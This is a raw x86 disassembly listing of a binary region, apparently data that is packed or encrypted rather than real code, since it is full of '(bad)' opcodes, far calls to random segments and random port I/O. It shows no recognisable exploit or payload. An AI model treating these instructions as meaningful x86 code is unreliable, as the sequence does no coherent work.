  4223ce:	add    DWORD PTR [ebp+0x46cdc3c6],ebx
  4223d4:	xor    esi,DWORD PTR [esi-0x31]
  4223d7:	add    eax,0x9acddf33
  4223dc:	ret    0x27ac
  4223df:	pushf  
  4223e0:	sub    al,0xdc
  4223e2:	ja     0x422449
  4223e4:	shl    DWORD PTR [edi+0x7dc27af6],1
  4223ea:	js     0x4223f2
  4223ec:	and    bl,BYTE PTR [edx+0x6bbadcec]
  4223f2:	mov    eax,ds:0x1fdf8d2f
  4223f7:	add    BYTE PTR [esi-0x3e7bf292],ch
  4223fd:	les    eax,FWORD PTR [ecx+0x3cd2953c]
  422403:	call   0x1064:0x5307dfa2
  42240a:	push   ecx
  42240b:	adc    bl,dl
  42240d:	xchg   esp,eax
  42240e:	pop    ebp
  42240f:	push   esi
  422410:	lahf   
  422411:	(bad)  
  422412:	dec    esi
  422413:	dec    eax
  422414:	les    esi,FWORD PTR [edi]
  422416:	dec    edx
  422417:	into   
  422418:	call   0xaa3f10f0
  42241d:	out    0x98,al
  42241f:	sbb    al,0x90
  422421:	or     eax,DWORD PTR [ecx+0x721c6397]
  422427:	inc    esi
  422428:	push   cs
  422429:	xor    eax,DWORD PTR [edi]
  42242b:	nop
  42242c:	and    BYTE PTR [esi+eax*8+0x6],al
  422430:	push   0xf60a9971
  422435:	call   0xe69b:0x6208e75
  42243c:	push   es
  42243d:	retf   
  42243e:	(bad)
  422442:	and    al,0xd4
  422444:	mov    ebx,0x1ccaeb78
  422449:	daa    
  42244a:	add    ch,BYTE PTR [edi-0x31142431]
  422450:	pop    eax
  422451:	stos   BYTE PTR es:[edi],al
  422452:	test   BYTE PTR [esi-0x20],al
  422455:	loopne 0x42248b
  422457:	not    esi
  422459:	sbb    bh,BYTE PTR [ebx]
  42245b:	cdq    
  42245c:	mov    BYTE PTR [edx-0x56eea20],bh
  422462:	out    dx,eax
  422463:	dec    edx
  422464:	mov    ds:0x65458f39,eax
  422469:	shl    DWORD PTR [esi+0xa38c4c],0x0
	...
  4224d4:	add    BYTE PTR [eax],al
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	or     eax,0x67d789af
  4224e7:	jo     0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [esi-0x5],ch
  4224f0:	mov    esp,0x99dcde2c
  4224f5:	ret    0xef53
  4224f8:	inc    edi
  4224f9:	in     eax,dx
  4224fa:	jns    0x4224e9
  4224fc:	or     eax,0xd6ea327e
  422501:	cmp    ecx,ecx
  422503:	jbe    0x4224b2
  422505:	call   DWORD PTR [edx]
  422507:	retf   
  422508:	push   ebp
  422509:	jg     0x4224e6
  42250b:	xor    al,bl
  42250d:	fadd   DWORD PTR [edx+0x78c8d15b]
  422513:	push   esi
  422514:	ja     0x422578
  422516:	jmp    0x3556:0x8bac8656
  42251d:	jb     0x422568
  42251f:	and    eax,0xe7a05fb
  422524:	ret    
  422525:	adc    DWORD PTR [edi+0x0],0xf
  422529:	arpl   ax,ax
  42252b:	jge    0x4224e7
  42252d:	outs   dx,DWORD PTR ds:[esi]
  42252e:	cs mov esi,0x565d3d18
  422534:	inc    edi
  422535:	mov    eax,ds:0xf28f322c
  42253a:	enter  0x87f8,0x7a
  42253e:	inc    esi
  42253f:	mov    al,ds:0x62da0cbd
  422544:	lods   eax,DWORD PTR ds:[esi]
  422545:	jp     0x422592
  422547:	mov    cl,0xd0
  422549:	popf   
  42254a:	pop    ss
  42254b:	mov    ebx,0x3c031b74
  422550:	sti    
  422551:	jo     0x4224e6
  422553:	arpl   WORD PTR [ecx+ebp*8],bp
  422556:	mov    DWORD PTR [ecx+0xe],ebp
  422559:	dec    edx
  42255a:	mov    ebx,0xc19b9146
  42255f:	aas    
  422560:	popfw  
  422562:	mov    eax,ds:0x13549d2e
  422567:	loopne 0x422532
  422569:	xchg   esi,eax
  42256a:	iret   
  42256b:	fdiv   st(6),st
  42256d:	xchg   esp,eax
  42256e:	sub    ecx,DWORD PTR [eax+0x36]
  422571:	fsubr  DWORD PTR [ecx]
  422573:	mov    esi,0x878b45a9
  422578:	(bad)  
  422579:	lods   eax,DWORD PTR ds:[esi]
  42257a:	fidivr DWORD PTR [ebx+0x1e]
  42257d:	pop    esp
  42257e:	adc    eax,0x63596d35
  422583:	push   cs
  422584:	fmul   DWORD PTR [ebp+0x1e2e3eb4]
  42258a:	imul   ecx,DWORD PTR [eax+edx*2+0x5b45d9cf],0xffffffe9
  422592:	shl    edx,cl
  422594:	and    DWORD PTR [edx-0x437c1139],eax
  42259a:	cmc    
  42259b:	mov    ch,BYTE PTR [ebx]
  42259d:	adc    eax,0xfa95f90f
  4225a2:	adc    BYTE PTR cs:[eax+ebx*2+0x4eab3309],cl
  4225aa:	adc    ebx,DWORD PTR [eax-0x52]
  4225ad:	mov    cs,WORD PTR [ebx+0x64]
  4225b0:	xchg   ecx,eax
  4225b1:	test   ebx,ecx
  4225b3:	(bad)  
  4225b4:	gs cdq 
  4225b6:	in     al,0xd7
  4225b8:	xchg   edi,eax
  4225b9:	jno    0x422633
  4225bb:	aas    
  4225bc:	mov    ecx,0xc080c98a
  4225c1:	sub    BYTE PTR [ebx-0x1c],bh
  4225c4:	retf   
  4225c5:	cmovle ebp,esp
  4225c8:	xchg   edi,eax
  4225c9:	pusha  
  4225ca:	jne    0x4225c6
  4225cc:	popf   
  4225cd:	push   DWORD PTR [esi-0x5a310c3]
  4225d3:	xor    DWORD PTR [ebx-0x5d],ecx
  4225d6:	je     0x4225a6
  4225d8:	push   ss
  4225d9:	repz xlat BYTE PTR ds:[ebx]
  4225db:	mov    eax,0x7d576d06
  4225e0:	pop    edx
  4225e1:	repnz push esi
  4225e3:	xor    BYTE PTR [eax],cl
  4225e5:	ins    BYTE PTR es:[edi],dx
  4225e6:	or     bl,BYTE PTR [edx-0x1cfd6795]
  4225ec:	test   DWORD PTR [esi],esi
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x71715d08]
  422664:	cdq    
  422665:	mov    cl,0x67
  422667:	jno    0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [ecx+eax*2+0x3],dh
  422671:	out    dx,eax
  422672:	inc    eax
  422673:	dec    edx
  422674:	popf   
  422675:	pop    esp
  422676:	mov    bl,al
  422678:	shl    eax,cl
  42267a:	sub    eax,0x5c67183d
  42267f:	gs in  eax,dx
  422681:	int3   
  422682:	out    dx,al
  422683:	jbe    0x422609
  422685:	retf   0xc96e
  422688:	je     0x422629
  42268a:	mov    ds:0x326abf7e,al
  42268f:	jl     0x4226fb
  422691:	into   
  422692:	jmp    0x4226fc
  422694:	push   0xe3a9d4ba
  422699:	test   BYTE PTR [esi],dh
  42269b:	das    
  42269c:	nop
  42269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269e:	cmp    edx,DWORD PTR [ecx-0x53]
  4226a1:	call   0x97c67df9
  4226a6:	jae    0x4226a4
  4226a8:	ds (bad) 
  4226aa:	or     ebx,ebp
  4226ac:	iret   
  4226ad:	pop    esp
  4226ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226af:	xchg   esp,eax
  4226b0:	(bad)  [ebp-0x44258cc7]
  4226b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b7:	int3   
  4226b8:	popf   
  4226b9:	mov    ah,0xf0
  4226bb:	mov    bl,0xf5
  4226bd:	mov    WORD PTR [ecx],ds
  4226bf:	jb     0x4226e3
  4226c1:	push   0xbc00f6e7
  4226c6:	mov    DWORD PTR [edi],esi
  4226c8:	jg     0x4226db
  4226ca:	outs   dx,BYTE PTR ds:[esi]
  4226cb:	xchg   ecx,eax
  4226cc:	and    ecx,DWORD PTR [ebp-0x25]
  4226cf:	adc    ah,BYTE PTR [ebx-0x1b750adf]
  4226d5:	fist   WORD PTR [esi]
  4226d7:	jnp    0x4226a1
  4226d9:	lahf   
  4226da:	adc    ebx,DWORD PTR [eax-0x3a]
  4226dd:	dec    eax
  4226de:	into   
  4226df:	push   esp
  4226e0:	dec    eax
  4226e1:	mov    DWORD PTR [ebp-0x10],edi
  4226e4:	nop
  4226e5:	aam    0x5a
  4226e7:	mov    ?,WORD PTR [eax-0x1a320ea9]
  4226ed:	not    DWORD PTR [esi-0x3e2a5f6b]
  4226f3:	call   0x7961:0x5f530b26
  4226fa:	jno    0x42277b
  4226fc:	mov    ebp,0xb825869b
  422701:	or     eax,0x23d3e492
  422706:	std    
  422707:	in     eax,0x29
  422709:	in     al,0x96
  42270b:	adc    bh,0x22
  42270e:	xor    dl,0x36
  422711:	add    DWORD PTR [ebx],edi
  422713:	aad    0x87
  422715:	xchg   DWORD PTR [ebp-0x36a931f5],esp
  42271b:	xchg   edx,eax
  42271c:	popa   
  42271d:	add    eax,0x638f94d6
  422722:	mov    dh,0xa7
  422724:	inc    ebx
  422725:	retf   0x8c9f
  422728:	cmp    ah,BYTE PTR [ecx-0x675b0fc8]
  42272e:	sti    
  42272f:	int3   
  422730:	lock jo 0x4226bd
  422733:	mov    dl,cl
  422735:	sbb    DWORD PTR [esi+ecx*8],ebp
  422738:	fild   DWORD PTR [edi-0x13]
  42273b:	add    al,dh
  42273d:	shl    BYTE PTR [edx+edx*2],1
  422740:	push   es
  422741:	test   dl,al
  422743:	push   0xffffffb4
  422745:	fstp   QWORD PTR [ebx+esi*2+0xd252c92]
  42274c:	out    0xa6,eax
  42274e:	cmp    DWORD PTR [eax+ebx*2+0x1e],ebx
  422752:	dec    eax
  422753:	dec    ebx
  422754:	lea    edi,[edi+ebx*4-0x16]
  422758:	adc    bh,BYTE PTR [edx+0x37b42845]
  42275e:	retf   0xb3de
  422761:	xchg   edi,eax
  422762:	out    dx,al
  422763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422764:	sbb    eax,0xb178ed1
  422769:	jle    0x422716
  42276b:	aad    0x94
  42276d:	cmp    al,0x0
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xc97f01c8
  4227e3:	ret    0xe24e
  4227e6:	addr16 jb 0x4227ea
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [esi+0x3],ch
  4227f0:	and    DWORD PTR [ecx-0x133e9f02],edi
  4227f6:	and    bl,ah
  4227f8:	aad    0x80
  4227fa:	mov    bl,0xd8
  4227fc:	inc    esp
  4227fd:	pushf  
  4227fe:	adc    BYTE PTR [esi-0x3c],cl
  422801:	ret    0x7f83
  422804:	shl    BYTE PTR [esi-0x22804c1a],cl
  42280a:	rcr    edx,cl
  42280c:	(bad)  [edi]
  42280e:	xchg   ebp,eax
  42280f:	lea    ebp,[ecx]
  422811:	adc    BYTE PTR [edx],al
  422813:	cmp    eax,0x70ce1391
  422818:	jns    0x422826
  42281a:	js     0x422803
  42281c:	fcmove st,st(3)
  42281e:	mov    esp,0x3624b114
  422823:	js     0x422802
  422825:	push   cs
  422826:	sti    
  422827:	jb     0x422860
  422829:	sub    al,0x37
  42282b:	inc    esp
  42282c:	cmp    BYTE PTR [eax+0x17],bh
  42282f:	mov    ebp,0x7c2127fb
  422834:	jl     0x422885
  422836:	icebp  
  422837:	mov    ecx,0x9430707f
  42283c:	int3   
  42283d:	mov    ebx,0xf2bcde63
  422842:	adc    BYTE PTR [ecx],al
  422844:	mov    WORD PTR [eax+0x3d],ds
  422847:	mov    dl,0xe3
  422849:	aad    0x60
  42284b:	push   ds
  42284c:	pop    eax
  42284d:	pop    esi
  42284e:	mov    ch,0x11
  422850:	jns    0x422888
  422852:	aam    0x15
  422854:	lock cmp edx,DWORD PTR [esp-0x405eeb0d]
  42285c:	adc    BYTE PTR [ebx],cl
  42285e:	pop    edi
  42285f:	cmc    
  422860:	mov    ds:0xb9f8c617,al
  422865:	mov    ah,0xe5
  422867:	arpl   WORD PTR [edi+edi*8],cx
  42286a:	xchg   edx,eax
  42286b:	cwde   
  42286c:	stos   BYTE PTR es:[edi],al
  42286d:	or     ecx,ebp
  42286f:	test   eax,0xacff97a
  422874:	daa    
  422875:	sub    dl,BYTE PTR [ebp-0x78]
  422878:	or     al,0x16
  42287a:	in     eax,0x64
  42287c:	dec    eax
  42287d:	pop    ds
  42287e:	daa    
  42287f:	sar    eax,cl
  422881:	retf   0xc3a8
  422884:	inc    ecx
  422885:	sahf   
  422886:	pop    esi
  422887:	xchg   ebp,eax
  422888:	fptan  
  42288b:	pop    esi
  42288c:	push   ecx
  42288d:	or     eax,0xf2ad939f
  422892:	jg     0x42290d
  422894:	xchg   ebp,eax
  422895:	xlat   BYTE PTR ds:[ebx]
  422896:	xchg   esp,eax
  422897:	jns    0x4228bc
  422899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42289a:	jns    0x4228e9
  42289c:	leave  
  42289d:	sub    al,0xb8
  42289f:	mul    DWORD PTR [ebp-0x41]
  4228a2:	rcr    BYTE PTR [esi],0x45
  4228a5:	imul   esp,DWORD PTR [esi],0xffffffe4
  4228a8:	mov    edi,ebp
  4228aa:	aam    0xa1
  4228ac:	sub    DWORD PTR [ebx-0x5e],esp
  4228af:	jl     0x422926
  4228b1:	xchg   al,dh
  4228b3:	mov    al,ds:0xc41bf761
  4228b8:	xchg   esp,eax
  4228b9:	call   0x6826:0x2ee96ff1
  4228c0:	aam    0x1
  4228c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228c3:	repz sub eax,0x2121dfb
  4228c9:	push   edx
  4228ca:	push   eax
  4228cb:	out    dx,al
  4228cc:	sbb    esi,DWORD PTR [edi-0x1e]
  4228cf:	push   ds
  4228d0:	add    eax,0x14567024
  4228d5:	mov    ebx,0xddff1f03
  4228da:	out    0x68,eax
  4228dc:	mov    esi,0xa8f6de2f
  4228e1:	push   edi
  4228e2:	jns    0x4228cc
  4228e4:	stos   BYTE PTR es:[edi],al
  4228e5:	ret    0x606e
  4228e8:	sub    DWORD PTR [esi+0x43],0xfffffff4
  4228ec:	ror    DWORD PTR [edi+0x0],cl
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x42293d
  422963:	test   al,0x46
  422965:	inc    esp
  422966:	addr16 jae 0x42296a
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR ds:0xf9e6dc1b,bl
  422973:	fs push 0xbb2617ed
  422979:	mov    BYTE PTR [ecx+ecx*2],dl
  42297c:	(bad)  
  42297e:	jle    0x42296b
  422980:	shl    DWORD PTR [ebp-0x37a33b44],cl
  422986:	sub    esi,DWORD PTR [edi]
  422988:	sbb    esp,ebx
  42298a:	mov    eax,0xe5bd3301
  42298f:	arpl   WORD PTR [ecx-0x6fbe145f],si
  422995:	psubsb mm3,QWORD PTR [eax-0x47]
  422999:	pushw  0xff94
  42299c:	fnstsw WORD PTR [edi]
  42299e:	add    bh,BYTE PTR [edx+0xe]
  4229a1:	icebp  
  4229a2:	mov    ds:0x3693531c,eax
  4229a7:	add    ebx,DWORD PTR [eax]
  4229a9:	mov    ah,BYTE PTR [edx-0x692b3e9a]
  4229af:	add    eax,0x7e1e1ccd
  4229b4:	adc    al,0x1d
  4229b6:	stos   DWORD PTR es:[edi],eax
  4229b7:	mov    WORD PTR [esi-0x3b],?
  4229ba:	pop    ds
  4229bb:	ret    0x9397
  4229be:	jecxz  0x422966
  4229c0:	and    eax,0x49da7e84
  4229c5:	pop    ecx
  4229c6:	fcomi  st,st(3)
  4229c8:	icebp  
  4229c9:	xchg   edi,eax
  4229ca:	jle    0x422985
  4229cc:	inc    edi
  4229cd:	out    dx,al
  4229ce:	add    al,0xfc
  4229d0:	jle    0x4229ee
  4229d2:	inc    edi
  4229d3:	sti    
  4229d4:	and    edx,DWORD PTR [edi-0x7f]
  4229d7:	push   edx
  4229d8:	js     0x4229f0
  4229da:	or     esp,DWORD PTR [edx]
  4229dc:	addr16 mov cl,0x4e
  4229df:	xchg   bl,dh
  4229e1:	dec    eax
  4229e2:	stos   BYTE PTR es:[edi],al
  4229e3:	cdq    
  4229e4:	jmp    0x4275:0x75012f40
  4229eb:	jp     0x4229df
  4229ed:	jmp    0x6b148a9e
  4229f2:	mov    edi,0x92b12cd0
  4229f7:	mov    esi,0x6fcf1114
  4229fc:	and    BYTE PTR [esp+esi*4+0x43],cl
  422a00:	ds mov bh,0xdd
  422a03:	and    al,0x68
  422a05:	out    0x42,al
  422a07:	sub    eax,edx
  422a09:	cmp    ebx,0xffffffa5
  422a0c:	call   0x3fb2:0x569a926
  422a13:	sahf   
  422a14:	dec    ecx
  422a15:	test   al,0x4f
  422a17:	lods   eax,DWORD PTR ds:[esi]
  422a18:	shl    DWORD PTR [ebp-0x20c4411c],0x2
  422a1f:	push   ebx
  422a20:	dec    eax
  422a21:	fdivp  st(5),st
  422a23:	dec    edx
  422a24:	adc    eax,0xa39eb6e2
  422a29:	inc    edi
  422a2a:	test   BYTE PTR [ebp+0x5884f9c],ah
  422a30:	cmp    ah,bh
  422a32:	or     al,0x57
  422a34:	cdq    
  422a35:	mov    ds:0x9a9e0466,eax
  422a3a:	inc    ecx
  422a3b:	sub    eax,0x45121582
  422a40:	and    ebp,DWORD PTR [ecx+0x271de185]
  422a46:	pop    ecx
  422a47:	fcomp  DWORD PTR [eax+0x14e4e773]
  422a4d:	daa    
  422a4e:	rcr    BYTE PTR [ebx+0x537bc32d],cl
  422a54:	pop    esi
  422a55:	mov    al,ds:0x9f265af
  422a5a:	lea    esp,[ebp+0x5]
  422a5d:	or     DWORD PTR gs:[ebx-0x7e],eax
  422a61:	xchg   DWORD PTR [eax],esi
  422a63:	add    edi,edi
  422a65:	je     0x422ae2
  422a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a68:	iret   
  422a69:	das    
  422a6a:	xlat   BYTE PTR ds:[ebx]
  422a6b:	out    dx,al
  422a6c:	push   DWORD PTR [eax+eax*1]
	...
  422ad3:	add    BYTE PTR [eax],al
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	push   esi
  422ae3:	popf   
  422ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae5:	lock addr16 je 0x422aea
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    bl,cl
  422aef:	daa    
  422af0:	fwait
  422af1:	loope  0x422a7b
  422af3:	mov    DWORD PTR [edi-0x69ec2ae3],eax
  422af9:	xor    eax,0xc6b1c376
  422afe:	enter  0x1650,0xc4
  422b02:	ret    
  422b03:	jge    0x422abc
  422b05:	test   DWORD PTR [ebx+esi*1-0x16],ebx
  422b09:	ds data16 ja 0x422ad7
  422b0d:	xchg   edi,eax
  422b0e:	xor    ecx,DWORD PTR [edx-0x7570b125]
  422b14:	loop   0x422b50
  422b16:	cdq    
  422b17:	xchg   ch,bl
  422b19:	int    0x30
  422b1b:	in     al,dx
  422b1c:	add    ebp,DWORD PTR [ebx+0x6bee1621]
  422b22:	push   es
  422b23:	dec    esp
  422b24:	mov    al,ds:0x7471fae1
  422b29:	shl    edx,0xe5
  422b2c:	xchg   ch,ah
  422b2e:	sub    eax,0x92cd87dc
  422b33:	in     eax,0x88
  422b35:	gs pop ds
  422b37:	les    edx,FWORD PTR [edx]
  422b39:	dec    esp
  422b3a:	int3   
  422b3b:	cld    
  422b3c:	push   edi
  422b3d:	cmp    DWORD PTR [eax+0x2422bdbc],eax
  422b43:	ja     0x422b6e
  422b45:	loop   0x422b5a
  422b47:	icebp  
  422b48:	mov    ch,0x41
  422b4a:	sbb    BYTE PTR [ebx+0x8],0x22
  422b4e:	xchg   edx,eax
  422b4f:	ret    0xd07a
  422b52:	dec    ebx
  422b53:	test   eax,0x37a544b9
  422b58:	mov    dl,0x62
  422b5a:	rcl    DWORD PTR [edx-0x27fa9e3],1
  422b60:	mov    ah,0x52
  422b62:	in     al,0xc1
  422b64:	aad    0xd6
  422b66:	lods   eax,DWORD PTR ds:[esi]
  422b67:	mov    ?,WORD PTR [esi+0x3ca78c06]
  422b6d:	sub    eax,DWORD PTR [esi+0x71a8c922]
  422b73:	repnz and al,0x34
  422b76:	hlt    
  422b77:	sar    BYTE PTR [edi-0x5],0xf6
  422b7b:	mov    dh,0xeb
  422b7d:	pop    ds
  422b7e:	adc    DWORD PTR [ebx],ecx
  422b80:	mov    al,0x1e
  422b82:	repnz pop ebp
  422b84:	push   cs
  422b85:	push   0xc
  422b87:	hlt    
  422b88:	inc    DWORD PTR [edx+0x40fd9253]
  422b8e:	mov    bl,0x8
  422b90:	in     al,0x7b
  422b92:	mov    dl,0xc0
  422b94:	rcl    DWORD PTR [edx],1
  422b96:	out    dx,eax
  422b97:	fwait
  422b98:	sub    ecx,ebx
  422b9a:	stos   DWORD PTR es:[edi],eax
  422b9b:	fisttp QWORD PTR [eax+0x4d]
  422b9e:	les    eax,FWORD PTR [esi-0x5e075d76]
  422ba4:	xchg   esp,eax
  422ba5:	test   eax,0x9672de05
  422baa:	pop    ebx
  422bab:	jl     0x422ba4
  422bad:	mov    esi,0x3307994b
  422bb2:	retf   
  422bb3:	cmova  ebp,DWORD PTR [edx+0x4]
  422bb7:	mov    ebp,DWORD PTR [edx+edx*4-0x9]
  422bbb:	pop    esp
  422bbc:	int3   
  422bbd:	fcomp  QWORD PTR [ebx-0x7e706aff]
  422bc3:	aam    0xe1
  422bc5:	and    eax,esp
  422bc7:	mov    eax,0xcfc3fece
  422bcc:	leave  
  422bcd:	sbb    DWORD PTR [edi-0x37],ecx
  422bd0:	mov    eax,ds:0xaa5bf736
  422bd5:	dec    edx
  422bd6:	int    0xac
  422bd8:	mov    edi,0x8b579bd4
  422bdd:	leave  
  422bde:	dec    ebx
  422bdf:	sti    
  422be0:	jns    0x422b85
  422be2:	push   ebp
  422be3:	aam    0xa9
  422be5:	mov    cl,BYTE PTR [edi+0x31077787]
  422beb:	xchg   ecx,eax
  422bec:	rol    DWORD PTR ds:0x0,0x0
	...
  422c53:	add    BYTE PTR [eax],al
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x22f9b264]
  422c64:	imul   ecx,DWORD PTR [ecx+0x17567],0x100
  422c6e:	(bad)  
  422c6f:	dec    esp
  422c70:	fucom  st(7)
  422c72:	push   ecx
  422c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c74:	inc    edx
  422c75:	mov    bl,0x87
  422c77:	gs enter 0xbaa1,0x52
  422c7c:	or     eax,0x7ea854b4
  422c81:	stos   BYTE PTR es:[edi],al
  422c82:	mov    ds:0xa735c0d,al
  422c87:	int3   
  422c88:	mov    cl,ah
  422c8a:	call   0xd06b1250
  422c8f:	xchg   ebx,eax
  422c90:	mov    al,ds:0xd25d99c4
  422c95:	adc    ebx,esi
  422c97:	out    0x6f,eax
  422c99:	jl     0x422c6e
  422c9b:	fild   QWORD PTR [edx-0x1f3c585b]
  422ca1:	push   0x5e91fb99
  422ca6:	nop
  422ca7:	xor    al,0x79
  422ca9:	pushf  
  422caa:	mov    ch,0x45
  422cac:	push   eax
  422cad:	sub    ebp,ebp
  422caf:	jnp    0x422ccf
  422cb1:	mov    eax,ds:0xd4d4a7d6
  422cb6:	mov    edi,0xa695f974
  422cbb:	pop    ebp
  422cbc:	loop   0x422d04
  422cbe:	stos   BYTE PTR es:[edi],al
  422cbf:	pop    esp
  422cc0:	fwait
  422cc1:	test   al,0x40
  422cc3:	retf   0xfa00
  422cc6:	je     0x422cff
  422cc8:	int3   
  422cc9:	inc    BYTE PTR [esi+0x4753960a]
  422ccf:	jb     0x422cc0
  422cd1:	pop    ecx
  422cd2:	fdiv   DWORD PTR [ebp+0x38]
  422cd5:	dec    edx
  422cd6:	mov    ds:0x82514675,al
  422cdb:	push   DWORD PTR [ecx+0x59a7361d]
  422ce1:	jne    0x422d5a
  422ce3:	xchg   ebx,eax
  422ce4:	ret    0xf431
  422ce7:	add    eax,0x7e22061e
  422cec:	out    dx,al
  422ced:	test   eax,0xc3dc9317
  422cf2:	leave  
  422cf3:	in     eax,dx
  422cf4:	add    DWORD PTR [eax],ebx
  422cf6:	aaa    
  422cf7:	stc    
  422cf8:	jp     0x422d34
  422cfa:	jnp    0x422d70
  422cfc:	sti    
  422cfd:	jnp    0x422ca5
  422cff:	cwde   
  422d00:	inc    ebp
  422d01:	inc    edx
  422d02:	xor    ebx,DWORD PTR [ebp-0x585022cd]
  422d08:	add    eax,DWORD PTR [ecx]
  422d0a:	pop    edi
  422d0b:	ret    
  422d0c:	xor    esp,edi
  422d0e:	sub    esp,DWORD PTR ds:0xb72f2699
  422d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d15:	mov    dl,0x4
  422d17:	pop    ebp
  422d18:	mov    ebx,0x4c32559e
  422d1d:	test   al,0x73
  422d1f:	dec    esi
  422d20:	in     eax,dx
  422d21:	mov    ah,0xe7
  422d23:	add    al,0x7c
  422d25:	mov    eax,0x3595db73
  422d2a:	lods   eax,DWORD PTR ds:[esi]
  422d2b:	add    bl,al
  422d2d:	fwait
  422d2e:	stc    
  422d2f:	arpl   WORD PTR [eax-0x76431c00],bp
  422d35:	jg     0x422d75
  422d37:	xchg   BYTE PTR [ebx],bl
  422d39:	in     eax,0xd
  422d3b:	pop    es
  422d3c:	rol    DWORD PTR [edx-0x74],0x95
  422d40:	nop
  422d41:	pop    eax
  422d42:	mov    ebp,0xb45977d1
  422d47:	dec    ecx
  422d48:	iret   
  422d49:	add    dl,BYTE PTR [ebp+0x2bb832ac]
  422d4f:	ret    
  422d50:	xor    al,0x48
  422d52:	cmp    dl,BYTE PTR [ebp+0x2]
  422d55:	lods   al,BYTE PTR ds:[esi]
  422d56:	jns    0x422d23
  422d58:	neg    al
  422d5a:	jl     0x422d20
  422d5c:	call   0xd609c790
  422d61:	bound  edi,QWORD PTR ds:0x4c651164
  422d67:	iret   
  422d68:	mov    al,0xa2
  422d6a:	mov    ah,0xbe
  422d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d6d:	xor    DWORD PTR [eax],eax
	...
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ebp,DWORD PTR [edx+0x675d47d5]
  422de7:	jbe    0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [edx+0xb],ch
  422df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422df1:	(bad)  
  422df2:	pop    esp
  422df3:	js     0x422db4
  422df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422df6:	imul   edi,ebx,0x6c
  422df9:	mov    edi,0x7c3fb2e
  422dfe:	ret    0x4b5f
  422e01:	(bad)  
  422e02:	fld    QWORD PTR [edi*4-0x485b93a8]
  422e09:	mov    esp,0x9530328
  422e0e:	rcr    DWORD PTR [ecx-0x243be2c7],cl
  422e14:	inc    eax
  422e15:	neg    DWORD PTR [edx]
  422e17:	xor    eax,0x7b00d3d1
  422e1c:	hlt    
  422e1d:	pushf  
  422e1e:	xchg   edi,eax
  422e1f:	imul   esi,DWORD PTR [ebp-0x32c6953a],0x28
  422e26:	or     BYTE PTR [ecx],al
  422e28:	stos   DWORD PTR es:[edi],eax
  422e29:	push   es
  422e2a:	or     eax,0x61a458c
  422e2f:	sti    
  422e30:	ins    BYTE PTR es:[edi],dx
  422e31:	test   DWORD PTR [ebx+0x989c6bb],eax
  422e37:	scas   al,BYTE PTR es:[edi]
  422e38:	mov    eax,0xcdd2a011
  422e3d:	shl    BYTE PTR ds:0xe71e510c,1
  422e43:	sub    dl,BYTE PTR [eax]
  422e45:	sbb    al,BYTE PTR [ecx-0x6e531f78]
  422e4b:	jmp    0x422e44
  422e4d:	mov    ecx,0x6f9efd4a
  422e52:	adc    al,0xc
  422e54:	and    eax,0x92cbfeee
  422e59:	xchg   ecx,eax
  422e5a:	and    BYTE PTR [eax],ch
  422e5c:	xlat   BYTE PTR cs:[ebx]
  422e5e:	iret   
  422e5f:	mov    eax,0xa0a23e3b
  422e64:	popf   
  422e65:	je     0x422e16
  422e67:	pop    edi
  422e68:	mov    esi,0x38077ecf
  422e6d:	inc    edx
  422e6e:	pop    edi
  422e6f:	aas    
  422e70:	sub    al,0x9c
  422e72:	sbb    BYTE PTR ds:0x8cbee500,ch
  422e78:	jle    0x422e01
  422e7a:	fld    DWORD PTR [ebp+0x53c15894]
  422e80:	inc    edx
  422e81:	xchg   ebx,eax
  422e82:	hlt    
  422e83:	jle    0x422e81
  422e85:	xor    esp,DWORD PTR [edi+0x2f]
  422e88:	lahf   
  422e89:	loope  0x422ecd
  422e8b:	mov    ds:0xb51c86b3,al
  422e90:	in     al,dx
